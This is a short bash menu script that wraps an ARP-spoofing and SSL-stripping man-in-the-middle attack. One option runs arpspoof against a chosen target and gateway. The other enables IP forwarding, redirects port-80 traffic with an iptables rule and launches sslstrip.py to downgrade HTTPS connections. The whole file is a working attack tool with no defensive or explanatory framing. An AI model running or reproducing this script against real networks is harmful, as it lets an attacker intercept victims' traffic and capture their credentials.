#!/bin/bash

while true
do
clear
figlet sslstrip
echo
echo
echo "[1] arpspoof"
echo "[2] start inject"
echo "[q] quit"
echo
read -p "input : " input
echo
sleep 1
if [[ $input = "1" ]];
then
	read -p "target : " target
	read -p "gateway : " gatwy
	sleep 1
	echo
	sleep 1
	arpspoof -i eth0 -t $target -r $gatwy
	echo

elif [[ $input = "2" ]];
then
	read -p "port : " port
	sleep 1
	echo
	sleep 1
	echo "starting.."
	sleep 1
	echo "1" > /proc/sys/net/ipv4/ip_forward
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port
	python sslstrip.py -l $port

elif [[ $input = "q" ]];
then
	exit;
	
else
	echo "please input in number.."
	sleep 3

fi
done
